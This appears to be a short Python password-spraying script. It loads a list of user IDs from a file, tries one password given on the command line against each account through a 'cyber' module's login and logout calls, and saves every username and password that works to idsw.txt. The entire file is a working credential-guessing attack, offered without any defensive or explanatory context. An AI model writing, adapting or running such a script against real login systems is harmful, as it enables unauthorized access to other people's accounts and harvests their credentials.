from sys import argv
import os
from cyber import *

id_file = os.path.dirname(__file__)+'user.txt'

def load_id():
    id_txt = open(id_file).read()
    lines = id_txt.split('\n')
    ids = map(lambda x: x.split(' '), lines)
    return ids

def main(ids):
    p = argv[1]
    fw = open("idsw.txt", "w")
    i=0
    try:
        for line in ids:
            i=i+1
            print (str(i)+" checking for "+line[0])
            if login_request(line[0], p):
                print("Succesful for: "+line[0])
                fw = open("idsw.txt", "a")
                fw.write(line[0]+" "+p+"\n")
                fw.close()
                logout_request(line[0])
    except Exception:
        raise
    finally:
        fw.close()


if __name__ == "__main__":
    main(load_id())